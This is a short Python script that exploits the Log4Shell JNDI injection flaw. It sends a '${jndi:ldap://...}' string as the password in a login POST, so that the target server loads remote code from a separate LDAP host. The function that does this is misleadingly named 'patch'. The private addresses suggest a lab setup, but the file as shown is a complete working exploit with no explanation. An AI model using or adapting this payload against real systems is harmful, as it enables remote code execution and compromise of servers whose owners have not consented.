# import package that can send http requests
import requests
import socket
import time
# define function that will send a post request
def post_form(ip, username, password):

    url = "http://" + ip + ":8080/Authorize"
    data = {"username": username, "password": password}

    response = requests.post(url, data=data)

    return



def patch(ip , ldap_ip, ldap_port, exp):
    password = "${jndi:ldap://"+ldap_ip+":"+str(ldap_port)+"/"+exp+"}"
    print(password)
    post_form(ip, "admin", password)

patch('192.168.98.144', '192.168.98.130', 1389, 'Exp')